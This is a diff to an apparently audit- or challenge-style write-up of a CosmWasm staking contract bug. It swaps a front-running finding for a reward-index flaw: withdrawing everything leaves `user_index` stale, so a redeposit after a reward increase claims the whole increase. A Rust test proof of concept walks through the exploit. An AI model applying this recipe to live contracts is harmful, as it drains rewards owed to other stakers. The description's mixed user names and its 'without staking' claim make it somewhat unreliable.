@@ -648,35 +648,129 @@ In this example, the malicious contract creates a new trade, offering a low-valu
 
 ### Description
 
-The provided contract has a potential "front-running" vulnerability. In particular, users (such as tx block proposers) who can predict when the owner will call `IncreaseReward` can add a deposit tx and reorder tx block to just before this happens to earn a disproportionate amount of rewards.
+User 1 deposits a large amount of tokens. This will set the `global_index` to a certain value since User A is the only one who has staked.
 
-The `IncreaseReward` function increases the `global_index`, which is used to compute the rewards for each user. When a user deposits or withdraws, their `user_index` is updated to the current `global_index`, and their rewards are computed based on the difference between the `global_index` and `user_index`. This means that if a user can deposit just before `global_index` increases, they can earn rewards as if they had staked their tokens for the entire period.
+User 1 withdraws all the staked tokens. This does not change the `global_index`, but it reduces User A's staked_amount to zero. However, the user_index for User A is still at the value of the `global_index` when the tokens were deposited.
+
+User 2 deposits a small amount of tokens.
+
+The contract owner increases the rewards.
+
+User 1 deposits tokens again. This does not change the global_index but it increases User A's staked_amount.
+
+User 1 claims their rewards. The reward calculation is `(state.global_index - user.user_index) * user.staked_amount`. The rewards User 1 gets the increased rewards without staking.
+
+This exploit is possible because `user_index` is not updated when all staked tokens are withdrawn.
 
 ### Recommendation
 
-In this example, the user contract deposits tokens just before it predicts the owner will call `IncreaseReward`.
-
-To mitigate this, the contract could implement a mechanism that randomly determines when rewards are increased, making it impossible for users to predict and exploit. Alternatively, the contract could impose a delay or waiting period on staking tokens before they are eligible to earn rewards.
-
-Please note that this is a general risk with any staking contract on a public blockchain and can be hard to prevent entirely. The degree to which it can be exploited will depend on factors like the gas price, blockchain congestion, and the specific implementation of the contract.
+Update the `user_index` when all staked tokens are withdrawn.
 
 ### Proof of concept
 
 ```rust
-// User contract that front-runs the IncreaseReward function
-# [cfg_attr (not (feature = "library"), entry_point)]
-pub fn execute(deps: DepsMut, _env: Env, _info: MessageInfo, msg: ExecuteMsg,) -> Result<Response, ContractError> {
-    match msg {
-        ExecuteMsg::FrontRunDeposit { amount } => {
-            let deposit_msg = ExecuteMsg::Deposit { };
-            let result = deps.api.execute_contract(&deposit_msg);
-            if result.is_err() {
-                return Err(ContractError::FailedDeposit);
-            }
-            Ok(Response::new().add_attribute("action", "front run deposit"))
-        }
+//
+#[test]
+    fn test_exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // user1 withdraws the full amount
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Withdraw {
+                amount: Uint128::new(10_000),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // query user1 info
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER.to_string(),
+                },
+            )
+            .unwrap();
+
+        assert_eq!(user_info.pending_rewards, Uint128::new(10000));
+
+        // new user2 join
+        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // owner increases reward
+        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(OWNER),
+            contract_addr.clone(),
+            &ExecuteMsg::IncreaseReward {},
+            &[coin(10_000, REWARD_DENOM)],
+        )
+        .unwrap();
+
+        // query user1 info
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER.to_string(),
+                },
+            )
+            .unwrap();
+
+        assert_eq!(user_info.pending_rewards, Uint128::new(10000));
+
+        // User deposits a small amount after the reward increase, without staking
+        app = mint_tokens(app, USER.to_owned(), Uint128::new(1));
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000u128, DENOM)],
+        )
+        .unwrap();
+
+        // query user1 info
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER.to_string(),
+                },
+            )
+            .unwrap();
+
+        assert_eq!(user_info.pending_rewards, Uint128::new(20000));
+
+        // User claims rewards
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::ClaimRewards {},
+            &[],
+        )
+        .unwrap();
+
+        // Check user's balance
+        let balance = app
+            .wrap()
+            .query_balance(USER.to_string(), REWARD_DENOM)
+            .unwrap()
+            .amount;
+        assert_eq!(balance, Uint128::new(20000));
     }
-}
 
 ```
 
